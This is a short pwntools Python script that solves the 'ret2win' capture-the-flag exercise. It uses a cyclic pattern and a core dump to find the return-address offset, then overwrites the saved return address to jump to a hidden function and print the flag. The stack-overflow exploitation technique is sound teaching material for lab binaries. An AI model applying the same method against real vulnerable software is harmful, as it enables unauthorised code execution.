# shout out to https://gist.github.com/zachriggle/e4d591db7ceaafbe8ea32b461e239320

from pwn import *

# Load binary into pwntools
elf = context.binary = ELF('ret2win')

# Enable verbose logging
context.log_level = 'debug'

# The binary ret2win has a function called ret2win, which we have to
# access by overwriting EIP with its address.

# Print out the target address
info("%#x target", elf.symbols.ret2win)

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Craft a new payload which puts the "target" address at the correct offset
payload = flat({
    pattern: elf.symbols.ret2win
})

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.recvuntil("Here's your flag:\n")

# Get our flag!
flag = io.recvline()
print(flag)
